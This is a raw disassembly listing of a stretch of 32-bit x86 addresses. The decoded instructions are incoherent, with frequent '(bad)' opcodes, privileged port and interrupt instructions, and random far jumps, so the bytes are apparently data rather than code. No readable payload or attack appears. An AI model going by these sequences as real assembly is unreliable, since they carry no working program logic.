  42746c:	add    BYTE PTR [eax],al
  42746e:	push   esi
  42746f:	cmp    DWORD PTR [edx-0x2f],0x5
  427473:	jno    0x427478
  427475:	pop    ecx
  427476:	int    0xf3
  427478:	popf   
  427479:	into   
  42747a:	push   ebx
  42747b:	mov    al,0x7e
  42747d:	enter  0xfd44,0x9b
  427481:	add    ecx,DWORD PTR [ebp*8+0x381c18ac]
  427488:	call   0x84543c19
  42748d:	push   ds
  42748e:	popa   
  42748f:	test   DWORD PTR [edx],esi
  427491:	push   ecx
  427492:	and    al,0xcd
  427494:	sub    cl,BYTE PTR [edx+0x37]
  427497:	in     al,dx
  427498:	test   BYTE PTR [ecx+0x7],bl
  42749b:	add    ecx,eax
  42749d:	aaa    
  42749e:	xchg   DWORD PTR [edx-0x2b264744],esi
  4274a4:	xchg   dl,ch
  4274a6:	inc    edi
  4274a7:	push   edx
  4274a8:	sub    al,0x70
  4274aa:	cmp    eax,DWORD PTR [esi-0x2edd20e8]
  4274b0:	push   0x6d
  4274b2:	xor    BYTE PTR [edi+ebp*4-0x3570d77d],cl
  4274b9:	xlat   BYTE PTR ds:[ebx]
  4274ba:	jmp    0x6cc5:0x8176780f
  4274c1:	jge    0x4274ea
  4274c3:	xor    esp,DWORD PTR [eax-0x4a]
  4274c6:	cwde   
  4274c7:	jecxz  0x427463
  4274c9:	mov    ah,0xed
  4274cb:	pop    ebx
  4274cc:	clc    
  4274cd:	jo     0x427489
  4274cf:	retf   
  4274d0:	stc    
  4274d1:	(bad)  
  4274d2:	cld    
  4274d3:	pop    ss
  4274d4:	jbe    0x4274b5
  4274d6:	repz xor eax,DWORD PTR [edx]
  4274d9:	ficom  WORD PTR [edx-0x7e196692]
  4274df:	pop    ebp
  4274e0:	test   DWORD PTR [esi-0x36],esp
  4274e3:	(bad)  
  4274e4:	rcl    DWORD PTR [ebp+0x61027859],cl
  4274ea:	clc    
  4274eb:	sbb    ah,BYTE PTR [esi-0x6b]
  4274ee:	aaa    
  4274ef:	icebp  
  4274f0:	scas   al,BYTE PTR es:[edi]
  4274f1:	push   ebp
  4274f2:	xchg   DWORD PTR [edi],esp
  4274f4:	ja     0x427500
  4274f6:	push   esi
  4274f7:	dec    ebx
  4274f8:	lods   eax,DWORD PTR ds:[esi]
  4274f9:	lahf   
  4274fa:	pusha  
  4274fb:	cld    
  4274fc:	push   es
  4274fd:	inc    ecx
  4274fe:	mov    dl,0x7e
  427500:	add    cl,BYTE PTR [ecx+0x32]
  427503:	mov    esi,0x3fd0ccb8
  427508:	pop    edx
  427509:	test   al,0xaa
  42750b:	int3   
  42750c:	add    cl,dl
  42750e:	out    0x96,eax
  427510:	ffreep st(0)
  427512:	sub    DWORD PTR [ecx-0x631748ad],ecx
  427518:	ror    BYTE PTR [edi-0x17],1
  42751b:	xor    eax,0x7726d84e
  427520:	mov    bl,0x90
  427522:	in     al,dx
  427523:	rcr    DWORD PTR [ecx+0x15c50b0a],cl
  427529:	(bad)  [edx+0x24]
  42752c:	cmp    BYTE PTR [edi-0x78],dl
  42752f:	ror    ch,cl
  427531:	sub    al,0xe7
  427533:	pop    ebx
  427534:	sub    dh,dl
  427536:	sub    esp,DWORD PTR [esi+ecx*2+0x14dffed1]
  42753d:	leave  
  42753e:	jne    0x4274ed
  427540:	stos   BYTE PTR es:[edi],al
  427541:	out    dx,al
  427542:	pusha  
  427543:	js     0x427574
  427545:	stos   BYTE PTR es:[edi],al
  427546:	or     esp,ebp
  427548:	fsub   st,st(7)
  42754a:	js     0x4274cf
  42754c:	clc    
  42754d:	retf   
  42754e:	aas    
  42754f:	or     DWORD PTR [esi+0x4b1f448c],esi
  427555:	addr16 push ds
  427557:	loop   0x4274e5
  427559:	fld    QWORD PTR [ebx+0x34]
  42755c:	jecxz  0x4275a3
  42755e:	rol    DWORD PTR [edi],1
  427560:	scas   eax,DWORD PTR es:[edi]
  427561:	je     0x4274f6
  427563:	lods   al,BYTE PTR ds:[esi]
  427564:	addr16 mov edx,0xc9f9df3b
  42756a:	pop    esp
  42756b:	pusha  
  42756c:	in     eax,dx
  42756d:	add    BYTE PTR cs:[eax],al
	...
  4275d4:	add    BYTE PTR [eax],al
  4275d6:	pop    esp
  4275d7:	test   al,0xc0
  4275d9:	stos   DWORD PTR es:[edi],eax
  4275da:	hlt    
  4275db:	jmp    0x42765c
  4275dd:	(bad)  
  4275de:	cmp    dh,BYTE PTR [esi]
  4275e0:	jbe    0x42764c
  4275e2:	mov    al,ds:0x677b65d8
  4275e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275e8:	add    DWORD PTR [eax],eax
  4275ea:	add    BYTE PTR [ecx],al
  4275ec:	add    BYTE PTR [eax],al
  4275ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275ef:	or     DWORD PTR [esi],esi
  4275f1:	inc    eax
  4275f2:	jmp    0xcf95:0x29507be1
  4275f9:	xor    cl,BYTE PTR [eax]
  4275fb:	cmp    dl,BYTE PTR ds:0x22af0c1e
  427601:	ja     0x427614
  427603:	cs pop esp
  427605:	adc    esi,edi
  427607:	mov    bh,0x6a
  427609:	cmp    eax,0x4077c366
  42760e:	pusha  
  42760f:	mov    edi,DWORD PTR [edi]
  427611:	div    BYTE PTR [edx]
  427613:	popf   
  427614:	stos   DWORD PTR es:[edi],eax
  427615:	pop    ebx
  427616:	mov    edx,0x6480bc71
  42761b:	(bad)  
  42761c:	mov    ah,0xb2
  42761e:	imul   ebx,DWORD PTR [esi-0x64],0x7f
  427622:	mov    ds:0x7c527e8a,eax
  427627:	ds fwait
  427629:	(bad)  
  42762a:	jge    0x427636
  42762c:	jecxz  0x4275e8
  42762e:	inc    ebx
  42762f:	xchg   BYTE PTR [eax],al
  427631:	fistp  DWORD PTR [eax]
  427633:	pop    edx
  427634:	ret    0x6452
  427637:	mov    ds:0xaeb035ae,al
  42763c:	or     al,0xf5
  42763e:	dec    edi
  42763f:	in     al,0xe2
  427641:	pop    ebx
  427642:	lds    edx,FWORD PTR [ecx]
  427644:	out    0x32,al
  427646:	in     al,dx
  427647:	xor    bl,dl
  427649:	and    dh,al
  42764b:	sbb    eax,0xc230581d
  427650:	cmp    BYTE PTR [ecx],dh
  427652:	fisub  DWORD PTR [esi+0x5e]
  427655:	sbb    eax,0xb213a899
  42765a:	add    BYTE PTR [edi],dh
  42765c:	call   0x7378:0xbb36e89e
  427663:	adc    DWORD PTR [esp+edi*4],edi
  427666:	mov    al,ds:0x75b0f36b
  42766b:	and    eax,esp
  42766d:	enter  0x144f,0xf8
  427671:	add    BYTE PTR [eax],0x36
  427674:	popf   
  427675:	sub    eax,0xac525a28
  42767a:	sbb    al,0x33
  42767c:	jns    0x4276bc
  42767e:	std    
  42767f:	mov    ss,edi
  427681:	mov    ds:0x7077f8e9,eax
  427686:	push   eax
  427687:	in     al,0x89
  427689:	retf   0x213f
  42768c:	lea    edi,[ebp+0x3ab2e462]
  427692:	jmp    0x427703
  427694:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427695:	mov    esp,0xcdd26c24
  42769a:	jmp    DWORD PTR [edi+ebx*8-0x21]
  42769e:	or     DWORD PTR [ebp+0x78],ebp
  4276a1:	adc    DWORD PTR [ebp+0x7b],ebp
  4276a4:	inc    ebx
  4276a5:	mov    dl,0x20
  4276a7:	test   BYTE PTR [eax],0x56
  4276aa:	add    al,0x93
  4276ac:	ds add al,0xbc
  4276af:	shl    DWORD PTR [edx-0x7f],1
  4276b2:	mov    ch,0x85
  4276b4:	int    0xfd
  4276b6:	or     al,0xdc
  4276b8:	inc    esp
  4276b9:	inc    esp
  4276ba:	iret   
  4276bb:	mov    ch,0xc7
  4276bd:	sub    ecx,DWORD PTR [esi]
  4276bf:	push   ecx
  4276c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4276c1:	jne    0x42765e
  4276c3:	std    
  4276c4:	imul   ecx,DWORD PTR [edx+eiz*2],0x46c874cc
  4276cb:	fcmovu st,st(1)
  4276cd:	loope  0x4276d1
  4276cf:	jbe    0x427698
  4276d1:	dec    edx
  4276d2:	stc    
  4276d3:	jb     0x42774d
  4276d5:	dec    ebp
  4276d6:	cmp    DWORD PTR [eax+0x6d],ebp
  4276d9:	stos   BYTE PTR es:[edi],al
  4276da:	es mov ebp,0x5679199f
  4276e0:	leave  
  4276e1:	in     eax,dx
  4276e2:	enter  0xc1fa,0xd4
  4276e6:	into   
  4276e7:	aaa    
  4276e8:	pop    ds
  4276e9:	xchg   DWORD PTR [esi],esi
  4276eb:	xor    al,0x6b
  4276ed:	mov    DWORD PTR [eax],0x0
	...
  427753:	add    BYTE PTR [eax],al
  427755:	add    BYTE PTR [ecx],al
  427757:	push   esi
  427758:	nop
  427759:	out    dx,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	out    dx,al
  42775c:	jg     0x42775d
  42775e:	in     al,dx
  42775f:	xor    al,0x86
  427761:	fnstcw WORD PTR [eax+0x67e4af27]
  427767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427768:	add    DWORD PTR [eax],eax
  42776a:	add    BYTE PTR [ecx],al
  42776c:	add    BYTE PTR [eax],al
  42776e:	iret   
  42776f:	mov    bl,0x42
  427771:	ins    DWORD PTR es:[edi],dx
  427772:	pop    ecx
  427773:	cwde   
  427774:	cmp    eax,0x34239526
  427779:	xchg   esi,eax
  42777a:	mov    ch,0x22
  42777c:	test   dl,cl
  42777e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42777f:	mov    dh,0x73
  427781:	cmp    BYTE PTR ds:0xf3a39018,0xb8
  427788:	push   0x2ed88f5e
  42778d:	ins    DWORD PTR es:[edi],dx
  42778e:	jmp    0x15372f01
  427793:	and    DWORD PTR [ebx],esp
  427795:	and    al,0xea
  427797:	dec    ebp
  427798:	cmp    al,0x26
  42779a:	xor    al,0x34
  42779c:	cmp    bl,BYTE PTR [ebp+ecx*1+0x78]
  4277a0:	inc    esp
  4277a1:	jnp    0x427808
  4277a3:	sti    
  4277a4:	adc    DWORD PTR [esi+0x7f],0xffffffa2
  4277a8:	sbb    eax,0xa4c5d20
  4277ad:	sub    eax,0x98205e20
  4277b2:	mov    eax,0x7a5a48d0
  4277b7:	arpl   WORD PTR [ebx+0x1d55c9c4],sp
  4277bd:	cmp    eax,0x358c638f
  4277c2:	call   0xcf574b10
  4277c7:	inc    edx
  4277c8:	xchg   edx,eax
  4277c9:	adc    al,0xee
  4277cb:	jle    0x42783c
  4277cd:	rcr    BYTE PTR [eax+0x5],cl
  4277d0:	neg    BYTE PTR [ebx+eiz*1-0x45]
  4277d4:	push   ss
  4277d5:	adc    eax,0xc9862ee5
  4277da:	cmp    BYTE PTR [edi+0x66],cl
  4277dd:	pushf  
  4277de:	ins    BYTE PTR es:[edi],dx
  4277df:	mov    ds:0x1679860b,eax
  4277e4:	popf   
  4277e5:	mov    ch,0xde
  4277e7:	pop    ebp
  4277e8:	arpl   dx,cx
  4277ea:	test   esp,0xa6a0c31a
  4277f0:	scas   al,BYTE PTR es:[edi]
  4277f1:	sub    cl,ch
  4277f3:	ror    edi,1
  4277f5:	sub    eax,0xbacbfee0
  4277fa:	inc    esp
  4277fb:	push   esp
  4277fc:	inc    DWORD PTR [ecx+ebx*4-0x2d62119f]
  427803:	lock push 0xcbea9bae
  427809:	inc    esp
  42780a:	mov    fs,WORD PTR [ebp+0x68c56953]
  427810:	jno    0x427884
  427812:	jne    0x427825
  427814:	std    
  427815:	mov    cl,0x70
  427817:	push   ebx
  427818:	sub    DWORD PTR [ebx+0x54a5d040],ecx
  42781e:	mov    ds:0xb243952,al
  427823:	aaa    
  427824:	mov    dl,0xdb
  427826:	cmp    eax,0x66423818
  42782b:	rol    BYTE PTR [ecx-0x27],1
  42782e:	sbb    ecx,DWORD PTR es:[edi]
  427831:	add    eax,esp
  427833:	mov    ds:0x31c6eb50,al
  427838:	jns    0x4277dd
  42783a:	push   ebx
  42783b:	lods   eax,DWORD PTR ds:[esi]
  42783c:	lds    ecx,FWORD PTR [edx-0x664c952e]
  427842:	or     al,0x14
  427844:	bound  ecx,QWORD PTR [ebx]
  427846:	mov    esp,0xe56b45c2
  42784b:	imul   esp,ebx,0xfc0c6ee4
  427851:	mov    ah,0xb0
  427853:	mov    al,0xa4
  427855:	aam    0xb0
  427857:	fisttp WORD PTR [ecx]
  427859:	inc    eax
  42785a:	mov    ch,0x2e
  42785c:	and    esi,ecx
  42785e:	mov    ss,ecx
  427860:	mov    ?,edx
  427862:	xchg   edx,eax
  427863:	daa    
  427864:	jl     0x4277f8
  427866:	ja     0x427847
  427868:	sbb    dl,dl
  42786a:	clc    
  42786b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42786c:	xchg   edi,eax
  42786d:	sbb    al,BYTE PTR [eax]
	...
  4278d3:	add    BYTE PTR [eax],al
  4278d5:	add    BYTE PTR [edx],bl
  4278d7:	mov    cl,BYTE PTR [ebx]
  4278d9:	inc    ebp
  4278da:	fwait
  4278db:	lds    ebx,FWORD PTR [esi-0x21]
  4278de:	jo     0x427945
  4278e0:	fldl2e 
  4278e2:	ret    
  4278e3:	ret    
  4278e4:	sbb    BYTE PTR [esi],dl
  4278e6:	addr16 test al,0x1
  4278e9:	add    BYTE PTR [eax],al
  4278eb:	add    DWORD PTR [eax],eax
  4278ed:	add    BYTE PTR [edi+0x10],ch
  4278f0:	inc    ebp
  4278f1:	cs fst st(1)
  4278f4:	fcmovbe st,st(4)
  4278f6:	pop    ss
  4278f7:	dec    esi
  4278f8:	sub    esi,DWORD PTR [esi+0x1c]
  4278fb:	sbb    bl,BYTE PTR [edi]
  4278fd:	mov    eax,ds:0x65c673e3
  427902:	xchg   esi,eax
  427903:	inc    eax
  427904:	repnz xchg ecx,eax
  427906:	push   esi
  427907:	lds    ecx,FWORD PTR [edi]
  427909:	mov    edx,0x59ffd1af
  42790e:	imul   edi,DWORD PTR [edx-0x26],0xbc8b3b39
  427915:	xchg   ecx,eax
  427916:	xor    al,0x4
  427918:	mov    bl,0xa1
  42791a:	mov    dh,BYTE PTR [edx-0x11085ffa]
  427920:	test   eax,0xed601233
  427925:	shl    BYTE PTR [esi-0x398e4551],1
  42792b:	ror    DWORD PTR [ebx],0x97
  42792e:	test   BYTE PTR [edi],al
  427930:	outs   dx,BYTE PTR ds:[esi]
  427931:	js     0x4278c8
  427933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427934:	popf   
  427935:	sub    BYTE PTR [ebp-0x3c],bh
  427938:	mov    bh,0x44
  42793a:	adc    al,0xe8
  42793c:	push   ebp
  42793d:	retf   
  42793e:	pop    ds
  42793f:	sar    DWORD PTR [ecx+0x33],1
  427942:	aad    0xe
  427944:	mov    DWORD PTR [esi],ebp
  427946:	stos   DWORD PTR es:[edi],eax
  427947:	and    dl,al
  427949:	pushf  
  42794a:	cmp    al,0xf8
  42794c:	sub    eax,0xeb4a0652
  427951:	mov    ?,esi
  427953:	jmp    0x4278e3
  427955:	jne    0x427950
  427957:	jmp    0x1c99:0xae5201fb
  42795e:	push   cs
  42795f:	xchg   edx,eax
  427960:	add    ah,0xaa
  427963:	fldcw  WORD PTR [edx+ecx*1-0x4fddf778]
  42796a:	cmp    al,0x20
  42796c:	popf   
  42796d:	jmp    0x289dd3b3
  427972:	pop    es
  427973:	sbb    dh,BYTE PTR [ecx+0x7bd16deb]
  427979:	stos   BYTE PTR es:[edi],al
  42797a:	sub    al,0x69
  42797c:	mov    esp,0xe2c85ff
  427981:	jl     0x427941
  427983:	pop    eax
  427984:	pop    esp
  427985:	adc    ah,BYTE PTR [ecx+0x16]
  427988:	cld    
  427989:	cdq    
  42798a:	(bad)  
  42798b:	sbb    al,0x65
  42798d:	pop    edi
  42798e:	lock icebp 
  427990:	lock retf 
  427992:	call   DWORD PTR [esi]
  427994:	pop    ebp
  427995:	cdq    
  427996:	clc    
  427997:	repnz stc 
  427999:	sahf   
  42799a:	xchg   DWORD PTR [ebx+ebx*4],ebx
  42799d:	sub    BYTE PTR [ecx-0x4010ffe6],ch
  4279a3:	iret   
  4279a4:	dec    ecx
  4279a5:	imul   ecx,DWORD PTR [eax],0x3528baf2
  4279ab:	pop    es
  4279ac:	mov    eax,0x1c2b98cf
  4279b1:	add    eax,0xec21a11e
  4279b6:	pop    esp
  4279b7:	push   ebx
  4279b8:	add    DWORD PTR [edi-0x490ae8bf],ecx
  4279be:	and    eax,DWORD PTR [edx]
  4279c0:	bound  edx,QWORD PTR [ecx+0x44]
  4279c3:	lahf   
  4279c4:	in     al,0x50
  4279c6:	fwait
  4279c7:	mov    dl,0x9
  4279c9:	in     al,0xd9
  4279cb:	adc    BYTE PTR [edi+eax*2],dl
  4279ce:	jp     0x427a28
  4279d0:	inc    esp
  4279d1:	push   cs
  4279d2:	bound  ebp,QWORD PTR [esi-0x5f]
  4279d5:	call   0x1fd6:0x46418acc
  4279dc:	and    ebx,DWORD PTR [edi+0x5d5a4582]
  4279e2:	ins    DWORD PTR es:[edi],dx
  4279e3:	adc    eax,DWORD PTR [esi+esi*8]
  4279e6:	(bad)  
  4279e7:	repz sub BYTE PTR [di-0x17de],0xd4
	...
  427a56:	call   0xdea3:0xffa3ffdd
  427a5d:	std    
  427a5e:	inc    edx
  427a5f:	jne    0x427a39
  427a61:	cmp    DWORD PTR [eax+0x76],0xfffffffc
  427a65:	enter  0xa967,0x1
  427a69:	add    BYTE PTR [eax],al
  427a6b:	add    DWORD PTR [eax],eax
  427a6d:	add    BYTE PTR [ebx-0x20],dl
  427a70:	xor    cl,ah
  427a72:	dec    edx
  427a73:	arpl   ax,si
  427a75:	ss fcomi st,st(3)
  427a78:	dec    esi
  427a79:	lds    ebp,FWORD PTR [eax+0x43]
  427a7c:	enter  0x7ff2,0xc4
  427a80:	cmp    eax,0x5069b440
  427a85:	dec    esi
  427a86:	sub    cl,BYTE PTR [edi+0x3b57c0fb]
  427a8c:	xchg   ebp,eax
  427a8d:	test   ah,dh
  427a8f:	ret    
  427a90:	add    ebp,DWORD PTR [ebx]
  427a92:	cld    
  427a93:	push   ds
  427a94:	jp     0x427b08
  427a96:	add    al,0x87
  427a98:	icebp  
  427a99:	out    0xf6,eax
  427a9b:	shl    DWORD PTR [ecx],0xfa
  427a9e:	repnz lahf 
  427aa0:	or     BYTE PTR [ebx+edx*1+0x26114c48],0x76
  427aa8:	cmp    eax,0x7140e75b
  427aad:	adc    BYTE PTR ds:0x7ea6c49e,dl
  427ab3:	mov    esp,0xc2b293e9
  427ab8:	mov    BYTE PTR [esi-0xa7528ce],bh
  427abe:	jg     0x427b15
  427ac0:	loopne 0x427a91
  427ac2:	jns    0x427a49
  427ac4:	or     eax,0x591246b1
  427ac9:	inc    ebx
  427aca:	mov    ebp,0x60713a69
  427acf:	pusha  
  427ad0:	xchg   ebx,eax
  427ad1:	jo     0x427adb
  427ad3:	adc    dl,cl
  427ad5:	sbb    al,0x6a
  427ad7:	adc    bh,0xc6
  427ada:	dec    esp
  427adb:	js     0x427b07
  427add:	or     edx,DWORD PTR [eax-0x1a3aff46]
  427ae3:	inc    ecx
  427ae4:	stc    
  427ae5:	mov    ebp,0xce06fe87
  427aea:	nop
  427aeb:	dec    edi
  427aec:	sbb    bl,cl
  427aee:	sbb    BYTE PTR [ecx-0x55],dh
  427af1:	repnz fld st(7)
  427af4:	pop    DWORD PTR [edx+0x6a]
  427af7:	jnp    0x427b01
  427af9:	bound  ebp,QWORD PTR [ebx]
  427afb:	stc    
  427afc:	mov    ah,0xe9
  427afe:	cld    
  427aff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b00:	push   edi
  427b01:	cmp    al,0xbb
  427b03:	scas   al,BYTE PTR es:[edi]
  427b04:	pop    edx
  427b05:	mov    edx,0xab387597
  427b0a:	inc    edi
  427b0b:	sti    
  427b0c:	sbb    BYTE PTR [edi+0x1],bh
  427b0f:	cwde   
  427b10:	(bad)  [esi]
  427b12:	ins    BYTE PTR es:[edi],dx
  427b13:	dec    edi
  427b14:	add    ch,bh
  427b16:	mov    ch,0xa9
  427b18:	sti    
  427b19:	push   ss
  427b1a:	xchg   ecx,eax
  427b1b:	xor    edx,DWORD PTR [esi+0x2bdf4805]
  427b21:	mov    eax,ds:0xbb88d50d
  427b26:	sub    BYTE PTR [esi+0x67],dl
  427b29:	adc    al,bl
  427b2b:	loopne 0x427b5e
  427b2d:	nop
  427b2e:	arpl   WORD PTR [esi+0x3eea4f18],si
  427b34:	mov    ds:0xbeef9d2d,eax
  427b39:	lahf   
  427b3a:	add    al,0xd
  427b3c:	push   0xd62b7c85
  427b41:	icebp  
  427b42:	pop    ebp
  427b43:	imul   ebx,DWORD PTR [edx+0x70ea6d8],0x2548b419
  427b4d:	outs   dx,BYTE PTR ds:[esi]
  427b4e:	and    edx,DWORD PTR [ecx-0x3a]
  427b51:	dec    esi
  427b52:	cmc    
  427b53:	loope  0x427b4e
  427b55:	dec    ecx
  427b56:	add    al,BYTE PTR [edx]
  427b58:	and    DWORD PTR [edx],esp
  427b5a:	xchg   ebx,eax
  427b5b:	lahf   
  427b5c:	jg     0x427af3
  427b5e:	mov    al,0x1b
  427b60:	loope  0x427b78
  427b62:	gs mov edx,0x29b36523
  427b68:	mov    eax,ds:0x1ec286b9
  427b6d:	and    BYTE PTR [eax],al
	...
  427bd3:	add    BYTE PTR [eax],al
  427bd5:	add    dl,cl
  427bd7:	mov    edx,DWORD PTR [edx+0x7b]
  427bda:	push   ebx
  427bdb:	sti    
  427bdc:	jmp    0x427b99
  427bde:	push   ecx
  427bdf:	mov    ecx,ebx
  427be1:	test   BYTE PTR [esp+ebp*1-0x55987a5a],0x1
  427be9:	add    BYTE PTR [eax],al
  427beb:	add    DWORD PTR [eax],eax
  427bed:	add    ah,dl
  427bef:	clc    
  427bf0:	aaa    
  427bf1:	jecxz  0x427b75
  427bf3:	ror    BYTE PTR [eax],1
  427bf5:	outs   dx,DWORD PTR ds:[esi]
  427bf6:	iret   
  427bf7:	jae    0x427c75
  427bf9:	push   esi
  427bfa:	aam    0x1
  427bfc:	sub    DWORD PTR [ebx-0x6cf86b45],ecx
  427c02:	cdq    
  427c03:	cld    
  427c04:	push   ebp
  427c05:	cmp    eax,0x6900993c
  427c0a:	ror    DWORD PTR [eax],0xcd
  427c0d:	test   DWORD PTR [ecx+edx*1+0x16],eax
  427c11:	cmc    
  427c12:	sar    BYTE PTR es:[edx+0x3c],1
  427c16:	sub    al,0x6d
  427c18:	sti    
  427c19:	out    dx,al
  427c1a:	mov    ebp,0x974fefa8
  427c1f:	mov    ss,WORD PTR [edx+0x386cddd0]
  427c25:	mov    esi,0xcf9883c7
  427c2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c2b:	pop    ebx
  427c2c:	mov    dh,0x17
  427c2e:	mov    bh,0x5b
  427c30:	xor    eax,DWORD PTR [esi+0x55c822a9]
  427c36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c37:	lea    eax,[edi]
  427c39:	mov    bh,0xe6
  427c3b:	sahf   
  427c3c:	pop    ds
  427c3d:	stos   BYTE PTR es:[edi],al
  427c3e:	jbe    0x427c67
  427c40:	and    dl,BYTE PTR ds:0x320b41ad
  427c46:	lds    ecx,FWORD PTR [edx]
  427c48:	cmc    
  427c49:	or     esp,ebx
  427c4b:	push   ebx
  427c4c:	repnz popf 
  427c4e:	push   ebp
  427c4f:	pop    edx
  427c50:	or     bl,0xd3
  427c53:	ins    BYTE PTR es:[edi],dx
  427c54:	sub    dl,BYTE PTR [edi+0x1b]
  427c57:	sbb    esi,esi
  427c59:	or     DWORD PTR [eax-0x12],ecx
  427c5c:	mov    dh,ah
  427c5e:	ret    
  427c5f:	lods   al,BYTE PTR ds:[esi]
  427c60:	sub    ecx,DWORD PTR [edi+0x7]
  427c63:	dec    edx
  427c64:	dec    ebp
  427c65:	fsub   st(4),st
  427c67:	sar    DWORD PTR [ebx+0x170593e2],cl
  427c6d:	xchg   ebp,eax
  427c6e:	fwait
  427c6f:	(bad)  
  427c70:	not    DWORD PTR [ebp-0x6e]
  427c73:	hlt    
  427c74:	imul   DWORD PTR [eax+0x4d]
  427c77:	popf   
  427c78:	inc    ebx
  427c79:	dec    BYTE PTR [edi+0x7a]
  427c7c:	loope  0x427c69
  427c7e:	pushf  
  427c7f:	inc    ebp
  427c80:	repnz sub edi,edx
  427c83:	xor    ah,BYTE PTR [ebx-0x71]
  427c86:	xlat   BYTE PTR ds:[ebx]
  427c87:	add    al,0x56
  427c89:	fsubr  st(4),st
  427c8b:	xor    ah,BYTE PTR [ecx-0x48f81ad1]
  427c91:	jbe    0x427cca
  427c93:	sbb    BYTE PTR [ecx],dl
  427c95:	in     al,dx
  427c96:	dec    edx
  427c97:	pop    eax
  427c98:	imul   ebx,DWORD PTR [eax-0x681f043f],0xc5d4944c
  427ca2:	xchg   ebx,eax
  427ca3:	xchg   esi,eax
  427ca4:	mov    eax,0x40865027
  427ca9:	outs   dx,BYTE PTR ds:[esi]
  427caa:	push   0x4b
  427cac:	and    al,0x87
  427cae:	stos   DWORD PTR es:[edi],eax
  427caf:	cs sahf 
  427cb1:	cmp    BYTE PTR es:[ebp+0x303dfa0],0x8
  427cb9:	and    bh,BYTE PTR [ecx+0x4d]
  427cbc:	xchg   ebp,eax
  427cbd:	sbb    ecx,ebx
  427cbf:	ret    
  427cc0:	add    eax,edx
  427cc2:	jo     0x427cfe
  427cc4:	into   
  427cc5:	daa    
  427cc6:	pop    ecx
  427cc7:	mov    al,0xe4
  427cc9:	inc    ecx
  427cca:	adc    al,0xc7
  427ccc:	xchg   edx,eax
  427ccd:	fiadd  WORD PTR [eax]
  427ccf:	sub    DWORD PTR [eax],ebp
  427cd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427cd2:	scas   al,BYTE PTR es:[edi]
  427cd3:	mov    cl,0x92
  427cd5:	push   cs
  427cd6:	out    0x6b,al
  427cd8:	inc    esp
  427cd9:	repz push edx
  427cdb:	in     al,dx
  427cdc:	xchg   ebp,eax
  427cdd:	ins    DWORD PTR es:[edi],dx
  427cde:	das    
  427cdf:	int    0x95
  427ce1:	je     0x427d20
  427ce3:	xchg   DWORD PTR [esi+eax*2],ecx
  427ce6:	mov    ds:0x205e016a,eax
  427ceb:	adc    dl,dh
  427ced:	lahf   
	...
  427d56:	mov    ds:0xf343b050,eax
  427d5b:	jecxz  0x427d50
  427d5d:	lock xchg DWORD PTR ds:0xe7b85d44,ebx
  427d64:	mov    DWORD PTR [edi],edi
  427d66:	stos   DWORD PTR es:[di],eax
  427d68:	add    DWORD PTR [eax],eax
  427d6a:	add    BYTE PTR [ecx],al
  427d6c:	add    BYTE PTR [eax],al
  427d6e:	mov    ecx,0xb9a00c8b
  427d73:	mov    al,0xb8
  427d75:	scas   eax,DWORD PTR es:[edi]
  427d76:	sub    ecx,esp
  427d78:	push   DWORD PTR [edi+0x38cde256]
  427d7e:	jge    0x427d59
  427d80:	push   esp
  427d81:	and    dh,ah
  427d83:	stos   BYTE PTR es:[edi],al
  427d84:	cdq    
  427d85:	inc    ah
  427d87:	or     BYTE PTR [ecx+ebp*1-0x114b1900],dh
  427d8e:	(bad)
  427d92:	in     eax,dx
  427d93:	out    0xe1,eax
  427d95:	mov    bl,0xcd
  427d97:	shr    BYTE PTR [eax+0x1704c4c],cl
  427d9d:	pop    es
  427d9e:	neg    BYTE PTR [ebp-0x41]
  427da1:	mov    ds:0xabad32b1,al
  427da6:	ja     0x427dd9
  427da8:	xchg   ebp,eax
  427da9:	out    0xd8,eax
  427dab:	add    al,bl
  427dad:	cli    
  427dae:	push   es
  427daf:	test   BYTE PTR ds:0xaeff9b75,0x1c
  427db6:	mov    al,ch
  427db8:	mov    eax,0x6e1e8267
  427dbd:	int    0x7d
  427dbf:	xchg   edi,eax
  427dc0:	jno    0x427d51
  427dc2:	popf   
  427dc3:	jl     0x427de2
  427dc5:	call   0xa6aa:0x1bf9a751
  427dcc:	pop    ebp
  427dcd:	add    BYTE PTR gs:[esi+0x64],al
  427dd1:	add    ebx,DWORD PTR [ebp+0x709ff880]
  427dd7:	sub    al,cl
  427dd9:	sar    BYTE PTR [ebp-0x7c],cl
  427ddc:	push   0x4e
  427dde:	dec    edx
  427ddf:	ja     0x427e46
  427de1:	stos   BYTE PTR es:[edi],al
  427de2:	pop    eax
  427de3:	sysenter 
  427de5:	push   ss
  427de6:	mov    bl,0xa6
  427de8:	loopne 0x427e31
  427dea:	out    dx,al
  427deb:	imul   eax,DWORD PTR [edi+0x1e],0xffffffb7
  427def:	fbld   TBYTE PTR [edx]
  427df1:	pop    ecx
  427df2:	jp     0x427e03
  427df4:	xor    BYTE PTR [edx+0x6e],bl
  427df7:	call   0x12632492
  427dfc:	lods   al,BYTE PTR ds:[esi]
  427dfd:	cmp    eax,0x3f65d90c
  427e02:	lds    esi,FWORD PTR [eax+0x7d]
  427e05:	xchg   edi,eax
  427e06:	or     DWORD PTR [esi-0x78],ebx
  427e09:	mov    DWORD PTR ds:0x5df5dbfa,esp
  427e0f:	fwait
  427e10:	xchg   DWORD PTR [eax],edi
  427e12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e13:	in     al,0xf0
  427e15:	jge    0x427e87
  427e17:	pop    esp
  427e18:	pop    ds
  427e19:	test   eax,0xf64f35f6
  427e1e:	adc    al,0x6c
  427e20:	aam    0x2f
  427e22:	int3   
  427e23:	fidivr DWORD PTR [eax]
  427e25:	dec    ebp
  427e26:	aaa    
  427e27:	cld    
  427e28:	dec    ebp
  427e29:	shl    DWORD PTR [ecx+ebx*2],0x89
